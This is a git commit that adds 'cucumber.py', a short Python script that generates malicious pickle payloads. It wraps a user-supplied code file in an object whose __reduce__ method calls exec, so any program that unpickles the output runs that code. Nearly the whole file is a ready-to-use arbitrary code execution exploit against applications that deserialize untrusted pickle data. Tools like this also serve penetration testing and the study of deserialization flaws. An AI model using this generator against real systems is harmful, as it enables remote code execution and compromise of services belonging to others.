f5ab23f5a64ae42e57dbfa3877b8a4709b85d37d
Oelin <42823429+Oelin@users.noreply.github.com>
2019-03-28 15:29:37 -0400

    Create cucumber.py

---
+++ cucumber.py
@@ -0,0 +1,60 @@
+#!/usr/bin/env python3
+
+
+
+'''cucumber, ACE via Python pickle unpacking.
+
+cucumber [path]'''
+
+
+
+from sys import argv, stdout
+from pickle import dumps
+
+
+
+def require(path):
+    try:
+        with open(path) as file:
+            text = file.read()
+
+        return text
+
+    except:
+        return False
+
+
+
+def output(bytes):
+    stdout.buffer.write(bytes)
+
+
+
+class exploit:
+    def __init__(self, code):
+        self.code = code
+
+    def __reduce__(self):
+        return (exec, (self.code,))
+
+
+def main():
+    if len(argv) == 2:
+        path = argv[1]
+        code = require(path)
+ 
+        if code:
+            object = exploit(code)
+            pickled = dumps(object)
+
+            output(pickled)
+
+        else:
+            print('Yikes!, unable to read from file.')
+
+    else:
+       print(__doc__)
+
+
+
+main()
